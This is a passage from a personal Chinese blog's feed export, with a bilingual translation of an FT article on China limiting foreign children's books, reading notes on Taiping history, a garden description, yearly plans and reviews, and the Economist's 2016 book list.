    <url>%2F2017%2F03%2F16%2FPolicy-Publish-Children%2F</url>
    <content type="text"><![CDATA[摘要和世界上许多的年轻读者一样，中国儿童是和那些熟悉的名字一起成长的，例如罗尔德·达尔的了不起的狐狸爸爸以及哈利波特系列。但是北京（政府）现在正采取新的措施来限制访问外国图书和出版物，它开辟了新的防线，以限制外部对中国社会的影响。 Financial Times：中国将加强进口儿童文学作品管制 原文：China tries to restrict access to foreign children’s books 和世界上许多的年轻读者一样，中国儿童是和那些熟悉的名字一起成长的，例如罗尔德·达尔的了不起的狐狸爸爸以及哈利波特系列。但是北京（政府）现在正采取新的措施来限制访问外国图书和出版物，它开辟了新的防线，以限制外部对中国社会的影响。 监管部门已经给出版商发出口头指示，限制外国作者编写的儿童书籍数量，具体要求根据他们掌握的订单情况确定。这一决定将使每年出版的中文儿童作品译本，从数以千计减少到几百种，其中一人说。 淘宝，中国最大的电子商务网站之一，持有者是马云的阿里巴巴，周五宣布它们将在平台上禁止销售所有的外国出版物。“为了规范淘宝在线购物平台，创造一个安全和安全的网上购物环境，增强消费者的信心和满意度，淘宝将把所有外国出版物和采购信息加入禁止条款，”阿里巴巴在一份声明中说。 业内专家对这一规则表示惊讶，并质疑这将如何影响快速增长的市场。“我无法想象这种限制是可行的，因为它的实施是如此困难，并且它对任何人或国家都没有任何好处，” 一个要求匿名的资深中文图书编辑说。 Jo Lusby，企鹅兰登书屋北亚区总裁，说：“中国的儿童市场繁荣发展，特别是在学龄前与图画书领域。”在亚马逊中国网站，六出10大畅销儿童书由外国作者，包括哈利·波特与死亡圣器，JK罗琳的一系列关于巫师男孩的冒险的第七部分和最后一部分，和Sam McBratney的“猜猜我有多爱你”，20年前发表以来已经在全球销售2千8百万份。 目前还不知道中国政府的哪一部分在主导限制儿童读物供应的行动。目前还不清楚这项禁令是否有效果，因为星期五的互联网搜索显示数百名中国销售商仍在销售外国儿童读物。 在这份阿里巴巴的声明中措辞含糊，它将同时禁止出售外国视频游戏，CD和DVD。淘宝的一个供应商告诉客户们：“我们可以说的是，珍惜你所拥有的每个人！从现在起，我们几乎可以肯定，如果要买到外国货将更加困难，更加昂贵，更加难得。” 中国的图书和杂志目录是被严格管制的。只有八家国营的进口商及其附属公司获准将外国书目引入内地。消费者们渴望的禁书在他们向往已久的台湾和香港，那里可以享受大陆读者无法体验的自由访问。 然而，网上卖家提供了一个漏洞，通过巧妙的关键词搜索——所谓的“代购”，可以找到成千上万的违禁品，有事业心的中间人从国外购买商品出售给内地客户。 尽管图书销售的总量在下降，中国的网上图书销售在过去五年中的增长超过四倍。随着生活水平的提高，儿童文学作品的销量增长尤其迅猛。 China tries to restrict access to foreign children’s booksLike millions of young readers around the world, Chinese children have grown up with popular titles such as Roald Dahl’s Fantastic Mr Fox and the Harry Potter series.But Beijing is now introducing new measures to restrict access to foreign books and publications as it opens a new front in its battle to limit outside influence on Chinese society.Regulators have given verbal instructions to publishers to limit the number of children’s books written by foreign authors made available in China, according to three people with knowledge of the order. The decision would reduce the thousands of children’s titles published in Chinese translation every year to just a few hundred, one of them said.Taobao, one of China’s biggest ecommerce sites and owned by Jack Ma’s Alibaba, said on Friday it would prohibit the sale of all foreign publications on its platform.“In order to regulate the Taobao online shopping platform and to create a safe and secure online shopping environment to enhance consumer confidence and satisfaction, Taobao will add all foreign publications and buyer information to its embargo rules,” Alibaba said in a statement. Industry experts expressed surprise at the ruling and questioned how it would affect a fast-growing market. “I can’t imagine this restriction to be possible, because its implementation is so difficult, and it also has no benefit whatsoever for the people or the country,” said a senior Chinese books editor, who asked not to be identified.Jo Lusby, managing director for Penguin Random House North Asia, said: “The children’s market is substantial and growing in China, in particular in the pre-school and picture book area.”On Amazon’s Chinese site, six out of the top 10 bestselling children’s books were by foreign authors, including Harry Potter and the Deathly Hallows, the seventh and final part of JK Rowling’s series about the adventures of a boy-wizard, and Sam McBratney’s illustration Guess How Much I Love You, which has sold 28m copies worldwide since being published 20 years ago. #THE CHILDREN’S MARKET IS SUBSTANTIAL AND GROWING IN CHINA, IN PARTICULAR IN THE PRE-SCHOOL AND PICTURE BOOK AREA It is not known which part of the Chinese government is leading the drive to limit the supply of children’s books. It was also unclear whether the ruling was having an effect, as internet searches on Friday revealed hundreds of Chinese vendors selling foreign children’s books.Ambiguity in the wording of Alibaba’s notice would also allow it to ban the sale of foreign video games, CDs and DVDs. One Taobao vendor wrote to customers: “All we can say is, everyone treasure what you have! From now on, we can be confident in saying that it will be more difficult, more expensive and more rare to buy foreign goods.”The contents of Chinese bookshelves and magazine stands are strictly regulated. Only eight state-owned importers and their subsidiaries are licensed to bring foreign titles into the mainland.Consumers eager for banned books have long sought them out in Taiwan and Hong Kong, which enjoy unfettered access to volumes inaccessible to mainland readers.However, online vendors have offered a loophole, with cleverly worded searches turning up thousands of illicit titles sold by so-called daigou, enterprising intermediaries who buy goods from abroad and sell them on to mainland customers.Online book sales in China have more than quadrupled during the past five years, even as overall book sales have dipped. Sales of children’s literature in particular have soared as living standards have risen. 扩展阅读 数据可视化（十）公共数据源列表]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Study The Master]]></title>
    <url>%2F2017%2F02%2F13%2FMaster%2F</url>
    <content type="text"><![CDATA[摘要 Master Citation Index（持续更新） Master Citation Index唐·诺曼 Donald Arthur NormanScientist 杰弗里·埃弗里斯特·辛顿（Geoffrey Everest Hinton） Information TechnologyHackersPaul Graham （保罗·格雷厄姆）美国著名程序员、风险投资家、技术作家。Paul Graham 以 Lisp 方面的工作而知名，也是最早的Web应用Viaweb的创办者之一，后来以近5千万美元价格被雅虎收购，成为Yahoo! Store。他拥有哈佛大学应用科学（计算机方向）博士学位，担任麻省理工学院副教授，并且在罗德岛设计学院和佛罗伦萨绘画艺术学院学习过绘画。 代表作：《黑客与画家》（Hackers &amp; Painters） 内容来自 Paul Graham 的博客，该文集主要讨论编程语言、黑客工作方法以及作者对于教育、版权制度和创业精神等方面的观点。书中的内容不但有助于了解计算机编程的历史、互联网行业规则，还有助于读者了解我们这个时代，走进 Hacker 的精神世界。 System SpecialistBrendan Gregg DTrace Top 1 Sasha Goldshtein Currently interested in .NET performance optimization, modern C++, parallel programming frameworks, production debugging, native mobile application development, Node.js, Microsoft Azure, and cyber-warfare (security). Sasha Goldshtein: Making .NET applications faster Sasha Goldshtein:Tracing Runtime Events in .NET Core on Linux 章亦春|agentzh Nginx developer, DTrace 动态追踪技术漫谈 Gustavo Duarte OS kernel Julia Evans OS kernel,DTrace,Rust Front Specialist邱俊涛 Front, Tools, methodology 主要的编程语言是Java和JavaScript，也有几年Linux下C语言的开发经验，喜欢各种动态语言，尤其如JavaScript，而现在Ruby也成了我工具箱里最主要的工具了。目前关注在前端，对于 使用前端技术搭建轻量级的Web应用尤为感兴趣。 《JavaScript核心概念及实践》《轻量级Web应用开发》《3周3Web设计》《Fun with underscore.js》 阮一峰 My name is Ruan YiFeng(阮一峰). You can call me Frank. I was born in 1970s.I am an IT developer focusing on web technology, and a strong advocate and believer of Free Software.Now I am employed by Alipay.com as an Node/JavaScript engineer.I have an Economics degree, and once worked for a local college in Shanghai as an assistant professor. ECMAScript 6入门（电子工业出版社，2014，ISBN 9787121238369）黑客与画家（人民邮电出版社，2011，ISBN 9787115249494）软件随想录（人民邮电出版社，2009，ISBN 9787115216342）异常流行幻象与群众疯狂/困惑之惑（[台湾]财讯出版社，2007，ISBN 9789867084385）下一个大泡泡（中国社会科学出版社，2005，ISBN 9787500452300） Database Specialist 盖国强 Oracle C Specialist 云风-吴云洋 C,Game真名吴云洋，曾任网易杭州研究中心总监，是网易《大话西游》、《梦幻西游》等游戏的主要开发者，他在2011年9月从网易辞职，并与前网易COO詹钟晖联合创办了简悦（EJOY）游戏公司，任公司CTO。Ejoy2D创始人（一款基于C和Lua开发的游戏图形引擎） 综合类 张子辰（龙哥/飞龙）|Wizard Zhang 大量 翻译作品，编程语言、算法、机器学习等 DevOps Yuxi Wang Tech Lead of Operations team at 本木医疗 全网统一账户实践 树莓派raspberrypi、saltstack-在线下自助机运维上的应用/ 通过-novnc-实现数千台自助机的实时可视化/ 概要知识地图 StuQ 技能图谱由 StuQ 发起的一个开源项目，志在汇集整理 IT 职业必备技术技能，帮助技术人梳理知识框架结构，并尝试提供学习路径和精华资源，方便技术人学习成长。 项目地址（Github） 纸质版 源代码库 NASA 来自火箭科学，NASA发布了大量的免费代码 | Linux Story]]></content>
      <tags>
        <tag>最佳工程实践</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一些有趣的电子书]]></title>
    <url>%2F2017%2F02%2F09%2FeBook%2F</url>
    <content type="text"><![CDATA[摘要 刻意练习：最好的学习是写一本相关领域的书 我的电子书：Everyone can publish an e-book 故事佛罗里达州立大学的心理学教授，安德斯·埃里克森（Anders Ericsson） 幼稚练习（naïve practice）： 从你自觉“基本可以了”的那一刻，进步就停滞了。刻意练习（deliberate practice）：预，是有明确预期（purposeful practice），怎样的练习成果是好，怎样是差，并且知道需要衡量哪些指标来给自己反馈。思，是要用脑思考，不是一味沿用老办法，而是用各种新方式不断尝试，如此，才能不断往上突破，真正能提升能力。 一项英国研究显示，伦敦的士司机与公交司机同样开车多年，但只有的士司机负责记忆空间位置的大脑海马区变大。盖因公交司机每日开同一条路线，固然驾轻就熟，大脑却未得足够挑战。而的士司机需要时时掌握伦敦最新路况，思考如何最快最顺地将乘客送达，大脑遂得充分发展。 一个学会拉《梁祝》的人，重复练五年后可能拉得不费吹灰之力，对曲子的控制力与表现力却不曾精进半分——没准还不如刚学会时。顶级医院里，老医生是一流人才，因其持续面对疑难杂症，必须不断突破自我。在无甚挑战的小医院，年资高的医生有时反而知识陈旧落后，还不如毕业没多久的年青医生。才能如逆水行舟，不进则退。顺风顺水地练了一万小时？你可能只是在幼稚练习。 我的电子书2016年7月份我已经提到，希望能实现一个小目标：出版一本专业书籍。目标虽小，实现不易。参阅了众多老司机的成功经验，我决定还是先整理一本电子书出来。《Linux Perf Master》Edition 0.1 在 2017 年初首次发布于GitBook，主题以Linux性能为核心，覆盖评估诊断、监控、优化的工具和方法论，还补充了几个参考案例，内容来源于过去一段时间翻译、发表过的文章，部分章节稍微调整了排版。 Everyone can publish an e-book 《The Linux Perf Master| 操作系统专家》 《The Cyber-Security Master | 网络安全专家》 《The Data Visualization Master | 数据可视化专家》 《The Machine Learning Master | 机器学习专家》 GitBook 工具链早期没有使用 Markdown 发表的文章，没办法做到一键复用，必须再次进行繁琐的排版。另外，个人也不推荐使用编辑器：GitBook Editor for Mac ，它使用起来不太友好，也很容易崩溃。也不推荐在本地搭建一套自己的GitBook服务端，对个人用户来说过于繁琐。我的方式是“本地编写+自动同步”的方式：Git + Markdown真是珠联璧合、威力无穷。更多细节请查看：我的写作工具链（持续更新） 基于用户需求和最大传播效果为目标的内容创作 License版权声明：自由转载-非商用-非衍生-保持署名| Creative Commons BY-NC-ND 4.0 You are free to Share copy and redistribute the material in any medium or formatThe licensor cannot revoke these freedoms as long as you follow the license terms. Under the following terms: Attribution — You must give appropriate credit, provide a link to the license, and indicate if changes were made.You may do so in any reasonable manner, but not in any way that suggests the licensor endorses you or your use. NonCommercial — You may not use the material for commercial purposes. NoDerivatives — If you remix, transform, or build upon the material, you may not distribute the modified material. No additional restrictions — You may not apply legal terms or technological measures that legally restrict others from doing anything the license permits. 参考文献 ECMAScript 6 入门 怎样练习，才能成为一流专家？| 科学松鼠会@游识猷]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>Developer</tag>
        <tag>最佳写作实践</tag>
        <tag>eBook</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[History:太平天国专史研究]]></title>
    <url>%2F2017%2F01%2F30%2FHistory-TaipingHeavenly%2F</url>
    <content type="text"><![CDATA[摘要 史景迁|《太平天国》 一、 史景迁|《太平天国》[美]史景迁 ，中译本，广西师范大学出版社 20170123 南京-&gt;广州（CZ3698）：总序，前四章20170130 于都 通阅 （春节） 等待时间长、延误概率高、环境噪声大、无法交谈、手机等电子设备关机，无聊感强烈。没有比机舱内更合适看书的场景了，如果手上有一本书，可以看得很专注。 1、作者：史景迁Jonathan Spence 人物Wiki词条 特点：文笔流畅，雅俗共赏，兼顾学术研究与通俗阅读。“把中国近代错综复杂的人物和史事，通过严谨的历史考证，参照专家的钻研成果，以说故事的方法娓娓道来”。 著作集： 《曹寅与康熙》 (Ts’ao Yin and the K’ang-hsi Emperor:Bondservant and Master) 1965 《改变中国》 (To Change China:Western Advisers in China,1620-1960) 《康熙》 (Emperor of China:Self-Portrait of K’ang-hsi) 《王氏之死》(The Death of Woman Wang) 《追寻现代中国》（The Search for Modern China） 《太平天国》(God’s Chinese Son:The Taiping Heavenly Kingdom of Hong Xiuquan) 《雍正王朝之大义觉迷》(Treason by the Book) 《前朝梦忆》(Return to Dragon Mountain: memories of a Late Ming Man) 2、来华传教士人物：埃德温-史蒂文斯牧师（Rev. Edwin Stevens）1832年10月 广州 “美国海员友好协会” （American Seaman’s Friend Society）耶鲁学院（Yale College） : 新英格兰 “觉醒” 思潮纽文海神学院(New Haven Theological Seminary) 技术：印刷 人物：梁发家贫，读书四年，刻字版为生。受雇于苏格兰新教传教士米怜（William Milne）,刻版、翻译。1827年，“伦敦传道会” (London Missionary Society) ,被任命为传教士。 人物：郭士立基督教”摩拉维亚兄弟会”（Moravian Brethren） 3、科举制1836年春初，洪火秀到广州参加府试。异兆：广州下了四十年来的第一场雪，足足两英寸厚。 1685年，设花县。距广州陆路三十英里，水路四十英里。 洪秀全：通过县试，未中府试洪仁玕：读过书未能登第冯云山：读过书未能登第杨秀清：“不识得多字墨”萧朝贵：“分外晓得道理”，实际知识，经验主义 “反孔子” 4、客家人与流民问题因社会秩序动荡，迁徙不绝，以致于某些地区，客家人比土著还多，尤其又以山区为甚。为了争夺居住地和耕地，摩擦不断。 韦昌辉家族：设作坊，打造军械 5、秘密会社与盗匪1805年，七大海盗首领曾结盟，将南中国海沿岸水域划分势力范围。婚姻：家中姐妹女儿或劫掠女子嫁给其他海盗收养：将可能成为首领的海盗收为义子男性首领与俘虏发展同性恋关系女性海盗首领：经营赌场，孀居广州，颇有资财。香港（英国）当局，反海盗行动，海盗沿西江退入广西内河，与河匪结合。两广水师疲弱，海盗坐大，从香港进口军火器械。 三合会 6、军事组织人物：冯云山 设计号旗系统：伍长：管辖四人两司马：管辖五个伍长 （25人）：两尺半 方形号旗卒长：管辖四个两司马 （104人）：卫旗旅帅：师帅：军帅：管辖五个师帅 （13155人） 7、太平军技术进化路线围攻长沙时期：精于建浮桥以集结部队，一座浮桥即跨越湍急的湘江矿工：广西、湖南招募数千名，积蓄大量火药，坑道作业水师：长沙四周河道，夺取几千艘船，船队浩荡，吸引更多的新成员加入；舰船与陆地火炮配合；通讯系统。 撤离长沙：技术、协调娴熟，沿湘江直趋武昌。25天连续作战行军483公里。 8、统治集团权力争夺与内部屠杀 9、意识形态与外交10、洪秀全与李自成对比相关阅读 读书笔记：《李自成》（姚雪垠 著）]]></content>
      <tags>
        <tag>History</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[江南园林艺术鉴赏]]></title>
    <url>%2F2017%2F01%2F30%2FArtistic-Garden%2F</url>
    <content type="text"><![CDATA[摘要 南京瞻园 南京瞻园瞻园园虽不大，却颇具特色： 山水园林：假山、人工湖造型设计艺术 政务园林：江宁布政使司衙门驻地，兼具行政和生活功能 历史园林：太平天国专史博物馆，史料较丰富。 瞻园位于南京市秦淮区夫子庙景区，坐北朝南，纵深127米，东西宽123米。是南京现存历史最久的明代古典园林，是江南四大名园。 其历史可追溯至明太祖朱元璋称帝前的吴王府，后赐予中山王徐达的府邸花园。清朝各任江南布政使办公的地点，太平天国时期为东王杨秀清王府、夏官副丞相赖汉英衙署和幼西王萧有和府。民国时，江苏省长公署、国民政府内政部、水利委员会、中统局、宪兵司令部看守所等政府机关曾设园内。瞻园历经岁月变迁，多次焚毁、修葺。 87年版《红楼梦》，赵雅芝版《新白娘子传奇》的白府取景地（待考证）。]]></content>
      <tags>
        <tag>Art</tag>
        <tag>摄影</tag>
        <tag>Sport</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Autobiography:我的2016年度盘点]]></title>
    <url>%2F2017%2F01%2F01%2FCheck2016%2F</url>
    <content type="text"><![CDATA[2016年度盘点一、实践 Oracle数据库迁移割接实践 基于LVS的AAA负载均衡架构实践 基于Ganglia实现服务集群性能态势感知 动态追踪技术：Linux喜迎DTrace 赠书活动 社区活动:GOPS上海站EGO社群:Commounity Over Code51CTO企业安全广州DevOps 运营工具链1）增加七牛云作为图片存储仓库：提高跨平台移植能力。2）小密圈：简书号第一次被注销（投诉后恢复），警惕。 搬家：两次，思路决定出路，过程优化。 摄影：上海市博物馆特辑（青铜、佛教造像、印章）、2016珠海航展特辑 出版：(探索中)如何出版技术书籍? 生活案例：性能优化思路：从珠海航展交通管控实践谈起 二、荣誉 高效运维社区|开放运维联盟 2016年度金牌作者 Writer #Ops 007 全部作者 三、文章列表 原创：数据可视化（一）思维利器 OmniGraffle 绘图指南 翻译：TED访谈Linus Torvalds: The mind behind Linux（高效运维公众号推荐） 原创：Oracle数据库迁移割接实践（高效运维公众号推荐） 原创：基于LVS的AAA负载均衡架构实践： 开源中国（首页推荐|每日一博），当日阅读2000+，收藏人数100+ 原创：基于Ganglia实现服务集群性能态势感知（开源中国推荐） 原创：动态追踪技术：Linux喜迎DTrace（开源中国推荐） 翻译：《Stack Overflow: The Architecture - 2016 Edition》（高效运维公众号推荐） 翻译：《Stack Overflow: The Hardware》 翻译：《LinkedIn开源Kafka Monitor》 翻译：Cyber-Security:网络安全专题 原创：《木马来袭：今天你被挖矿了吗？》 原创：《木马来袭：SSH并不安全》 原创：《最佳写作实践：从Evernote到Ulysses》 原创：《基于Linux单机的负载评估》 翻译：《Linux性能分析模型－In 60 Seconds》 原创：基于Github的开源项目管理流程（1） 翻译：NTOP 2016 路线图（开源中国推荐） 原创：美军体能训练观察 原创：美军士官制度观察 原创：体能标准横向评测 原创：跑步应用Nike+ Running与Garmin Mobile评测 读书笔记：《李自成》（姚雪垠） 读书笔记：《万历十五年(黄仁宇)》 读书笔记：《放宽历史的视界》(黄仁宇) 读书笔记：《国士无双伍连德》 读书笔记：粮食还是罂粟？小说中的经济学悖论 读书笔记：传统兵法摘要：选兵练将 翻译：Economist译文:欧洲难民计划：移民危机管理 翻译：Economist译文:The Saudi blueprint 沙特王国的改革蓝图 翻译：Economist译文:2016年全球经济形势预测 翻译：Economist译文:印度电商竞赛 翻译：Economist译文:越共换届－巨变或轮回？（201612封禁） 翻译：Economist译文:事与愿违的后门程序 翻译：Economist译文:当代德国纳粹魅影 翻译：Economist译文:自由迁徙的障碍（201612封禁） 翻译：Economist译文:奢侈品—万金藏獒（201612封禁） 原创：钞票任务：风流小王爷 原创：艺术评论：舞台剧《南海十三郎》幕后故事 原创：艺术评论：电影《灵魂解码《林肯》》 2016年中盘点要点1.从阅读到翻译的进化 2.若要阅读，必须写作，做项目一样去写作 3.注意力是最宝贵的资源 4.向看不见的朋友学习 5.人的终极追求：”Just for Fun!” 6.付费意识：为演化买单 最佳信源：《Economist》如何使用有限的篇幅阐述观点如何在团队活动中协调一致性：《the economist style》如何建立专业分析数据库，数据可视化 最佳教练：专业社区高效运维社区、InfoQ社区、GitHub社区 工具箱：写作三件套素材仓库：Evernote思维绘图：OmniGraffle专业写作：Ulysses 不可忽视随机事件的驱动力 分类:我的自传source:https://riboseyim.github.io/2017/01/01/Check2016/]]></content>
      <tags>
        <tag>我的自传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HomeWork:2017年初制定的一些计划]]></title>
    <url>%2F2016%2F12%2F19%2FCheck2017-Plan%2F</url>
    <content type="text"><![CDATA[Technology [ ] FlameGraph目标定位：熟练使用立项时间：2015年11月当前进度：—– [ ] 源码解读系列文集目标定位：面向输出的学习能力立项时间：2016年2月当前进度：—– [x]《TCP／IP详解》【英】 目标定位：通读 立项时间：2016年11月 当前进度：略读 [x]《Google SRE》【英】 目标定位：通读、选择一个专题实践 立项时间：2016年5月 当前进度：略读 [x]《Introducing Go》【英】 目标定位：通读、熟练掌握 立项时间：2016年11月 当前进度：完成（201705） [ ]《Learning Spark》【英】 目标定位：通读、熟练掌握 立项时间：2016年11月 当前进度：——— [x]《How LINUX works》【英】 目标定位：通读、分享一篇 立项时间：2016年11月 当前进度：完成（201705） [x]读书笔记|《图解性能优化》 当前进度：通读 Books [X]《李自成》 （完成） [X]《白鹿原》 （完成） [X]《戴笠传》 （完成） [X]《蒋介石日记》 （完成） [X]《吾国吾民》 （完成） [ ] 《林肯传（英文版）》 （50%） [ ] 《通往奴役之路（英文版）》（0%） [ ]《Team of Rivals，the Political Genius of Abraham Lincoln》目标定位：通读立项时间：2016年中当前进度：—– [ ]《The Water Kingdom: A Secret History of China》目标定位：通读立项时间：2016年12月当前进度：—– [ ]《罗马帝国衰亡史》目标定位：通读立项时间：2014年当前进度：—– [x]《太平天国》（史景迁）（英译中）目标定位：通读立项时间：2016年11月当前进度：完成（201701） [x]《明代漕运 1368-1644》目标定位：通读立项时间：2016年11月当前进度：完成（201705） [x]《十六世纪明代中国之财政与税收》目标定位：通读立项时间：2016年10月当前进度：完成（201705） 创作计划 [x] 技术《源码解读系列：Git》立项时间：2015年当前进度：—– [x]工具类《优雅绘图指南》（关于技术绘图）立项时间：2015年当前进度：—– [x]电子书GitBook:《Linux Perf Master》立项时间：2016年11月当前进度：201702 Edition 0.1201707 Edition 0.2201712 Edition 0.3]]></content>
  </entry>
  <entry>
    <title><![CDATA[The Economist 2016年度推荐书单]]></title>
    <url>%2F2016%2F12%2F09%2FEconomist-Books-Year-2016%2F</url>
    <content type="text"><![CDATA[摘要 The Economist:Books of the Year 2017 The Economist:Books of the Year 2016 Books of the Year 2016《经济学人》每年都会推出一个年度书单，包含时事政治、传记&amp;回忆录、历史、经济&amp;商业、文化&amp;社会、小说、科学&amp;技术等板块。2016年度的书单里面，和中国密切相关有5本： The Water Kingdom: A Secret History of ChinaBy Philip Ball. Bodley Head; 316 pages; £25. To be published in America by University of Chicago Press in March 2017 How two great rivers—the Yellow river and the Yangzi—shaped China’s history. By a British science writer who for 20 years was an editor at Nature. China’s FutureBy David Shambaugh. Polity; 195 pages; $19.95 and £14.99No country has modernised its economy without also becoming a democracy. A respected American political scientist asks whether China can break the mould. CEO, China: The Rise of Xi XXXBy Kerry Brown. I.B. Tauris; 288 pages; $28 and £20What sort of leader is Xi XXX? There are few political questions to which the answer will have greater bearing on people as this. By an expert British China-watcher. China’s Crony Capitalism: The Dynamics of Regime DecayBy Minxin Pei. Harvard University Press; 365 pages; $35 and £25.95How decentralising the rights of control over state property, without clarifying the rules of ownership, offered those who rule China the greatest chance in history to grow rich, by a professor of government now based in California. Alibaba: The House That Jack Ma BuiltBy Duncan Clark. Ecco; 287 pages; $27.99 and £18.99An intriguing insider’s account of how Jack Ma conquered China’s internet, by an early adviser to the company 1----------------------------------------- The best books of 2016 are about China, language, microbes, hereditary power,inequality and medieval manuscripts Dec 10th 2016 Timekeeper Politics and current affairsChina’s FutureBy David Shambaugh. Polity; 195 pages; $19.95 and £14.99No country has modernised its economy without also becoming a democracy. A respected American political scientist asks whether China can break the mould. Black Wind, White Snow: The Rise of Russia’s New NationalismBy Charles Clover. Yale University Press; 360 pages; $35 and £25A veteran Financial Times correspondent analyses what really motivates the regime in Moscow by tracing the rise of Eurasianism: the belief (crudely put) that Russia’s national identity is determined by ethnicity, geography and destiny. The Euro and the Battle of IdeasBy Markus Brunnermeier, Harold James and Jean-Pierre Landau. Princeton University Press; 440 pages; $35 and £24.95Three authors focus on France and Germany to tease out the clashing economic ideas that make up the euro project. The Germans like rules and discipline, and fret about excessive debt and the moral hazard created by bail-outs. The French prefer flexibility and discretion, and worry about the lack of a mutualised debt instrument. German policymakers are often lawyers, French ones more frequently economists. Not a happy marriage. CEO, China: The Rise of Xi JinpingBy Kerry Brown. I.B. Tauris; 288 pages; $28 and £20What sort of leader is Xi Jinping? There are few political questions to which the answer will have greater bearing on people as this. By an expert British China-watcher. China’s Crony Capitalism: The Dynamics of Regime DecayBy Minxin Pei. Harvard University Press; 365 pages; $35 and £25.95How decentralising the rights of control over state property, without clarifying the rules of ownership, offered those who rule China the greatest chance in history to grow rich, by a professor of government now based in California. The Egyptians: A Radical Story By Jack Shenker. Allen Lane; 528 pages; £15.99A refreshing account, by a young reporter on the Guardian, of the movement that overthrew Hosni Mubarak in 2011. What distinguishes his writing from others’ is his presence in the slums, factories and homes where Egyptians first began questioning their relations with their rulers. Mr Shenker evokes despair at the economy of this badly run country, but also surprising hope for its future, thanks to a young generation that says it is “no longer prepared to put up with the old crap”. Trials: On Death Row in PakistanBy Isabel Buchanan. Jonathan Cape; 264 pages; £16.99Two young lawyers, one Pakistani and one British (the author), launch themselves into the dark world of Pakistan’s death row, where 8,000 people await execution. A remarkable first book written with verve and an eye for telling detail. Hillbilly Elegy: A Memoir of a Family and Culture in CrisisBy J.D. Vance. Harper; 264 pages; $27.99. William Collins; £14.99Why so many people want to believe that Donald Trump will bring back manufacturing jobs and keep immigrants out. Possibly the most important recent book about America. The Art of Charlie Chan Hock ChyeBy Sonny Liew. Pantheon; 320 pages; $30 and £25A brilliantly inventive graphic novel, which took several years to complete, weighs up the costs and benefits of life in the small, authoritarian, model city-state that Lee Kwan Yu founded half a century ago. By a Malaysian-born comic artist and illustrator, now based in Singapore. The Way to the Spring: Life and Death in PalestineBy Ben Ehrenreich. Penguin Press; 428 pages; $28. Granta; £14.99An elegant and moving account of the trials of one family, a tale that is symbolic of the daily lives of many Palestinians. Biography and memoirThe Return: Fathers, Sons and the Land In BetweenBy Hisham Matar. Random House; 256 pages; $26. Viking; £14.99A beautifully written memoir that deals with the nature of family, the emotions of exile and the ties that link the present with the past—in particular, the son with his father, Jaballa Matar, who disappeared in a notorious Libyan prison. Elizabeth: The Forgotten YearsBy John Guy. Viking; 490 pages; $35 and £25Most historians focus on the early decades, with Elizabeth’s last years acting as a postscript to the beheading of Mary Queen of Scots and the defeat of the Spanish Armada. An Australian-born historian, now a fellow at Cambridge, argues that this period is crucial to understanding a more human side of the smart redhead. Half-Lion: How P.V. Narasimha Rao Transformed IndiaBy Vinay Sitapati. Penguin India; 391 pages; 699 rupeesThe real father of India’s economic reforms deserves a place alongside Nehru as India’s most important prime minister. Instead he was cast into ignominy and obscurity. An important book, by a young doctoral student at Princeton, that deserves wider circulation. When Breath Becomes Air By Paul Kalanithi. Random House; 238 pages; $25. Bodley Head; £12.99A young neurosurgeon, dying of cancer, examines his life, especially the gift of language, the parts of the brain that control it and its centrality to what makes us human. A powerful and compelling read. Karl Marx: Greatness and Illusion By Gareth Stedman Jones. Belknap; 768 pages; $35. Allen Lane; £35A British historian re-evaluates Marx in the 21st century. There is no better guide than this professor of the history of ideas at the University of London. Negroland: A Memoir By Margo Jefferson. Vintage; 248 pages; $16. Granta; £12.99Growing up an African-American of privilege and wealth might seem cushy. But this penetrating memoir shows how those who were spared the brutality of southern segregation nevertheless had to learn to navigate a much subtler set of tacit rules and assumptions: excel, but don’t show off; be comfortable anywhere, but be aware that prejudice can rear its ugly head at any moment. Kenneth Clark: Life, Art and “Civilisation”By James Stourton. Knopf; 478 pages; $35. William Collins; £30At once cold and grand, Kenneth Clark would be easy to mock. A carefully researched and thoughtful biography of a conflicted and curiously unknowable man who became the most brilliant cultural populist of the 20th century, by a former chairman of Sotheby’s. Born to Run By Bruce Springsteen. Simon &amp; Schuster; 528 pages; $32.50 and £20The timely autobiography of the bard of American deindustrialisation, whose songs recognise and honour blue-collar woes. His stories have never aged; years after they were written they remain a lesson in empathy for the white-collar fans he has always attracted. But You Did Not Come BackBy Marceline Loridan-Ivens. Translated by Sandra Smith. Atlantic Monthly Press; 112 pages; $22. Faber; £12.99In 1944, when she was 15, the author and her father were captured and deported; he to Auschwitz, she to Birkenau. She returned; he never did. It took her 70 years to write her story. In tight, unsparing prose, she confronts the delusions her father held, and the lies she told herself. A small book with a big voice. The Civil Wars of Julia Ward Howe A BiographyBy Elaine Showalter. Simon &amp; Schuster; 243 pages; $28A delightful life, by a spirited academic, of a 19th-century American woman who wrote poetry, plays and books, became a tireless speaker for feminist causes, notably women’s right to vote. Her life intersected with Longfellow, the Brownings, Louisa May Alcott and Henry James. But she is best known for writing the words to “The Battle Hymn of the Republic”. Outlandish Knight: The Byzantine Life of Steven RuncimanBy Minoo Dinshaw. Allen Lane; 767 pages; £30By the time he died, in 2000 at the age of 97, Sir Steven Runciman had become convinced that he was a relic of a past age and the embodiment of a nearly mythical era. A lively life of a colourful British historian who was best known for his work on the Crusades, by a promising young author. A debut to be proud of. HistoryThe Water Kingdom: A Secret History of ChinaBy Philip Ball. Bodley Head; 316 pages; £25. To be published in America by University of Chicago Press in March 2017 How two great rivers—the Yellow river and the Yangzi—shaped China’s history. By a British science writer who for 20 years was an editor at Nature. The Romanovs: 1613-1918By Simon Sebag Montefiore. Knopf; 784 pages; $35. Weidenfeld &amp; Nicolson; £25A cruel history of hereditary power, by a master storyteller who lifts this unfamiliar narrative with vivid, amusing and surprising details. The Pursuit of Power: Europe 1815-1914By Richard Evans. Viking; 928 pages; $40. Allen Lane; £35A distinguished scholar of Germany tots up the winners and losers in the century after the Battle of Waterloo, which could rightly be described as the first age of globalisation. Heart of Europe: A History of the Holy Roman EmpireBy Peter Wilson. Belknap; 941 pages; $39.95. Allen Lane; £35The Holy Roman Empire, on paper, looked more like a Jackson Pollock 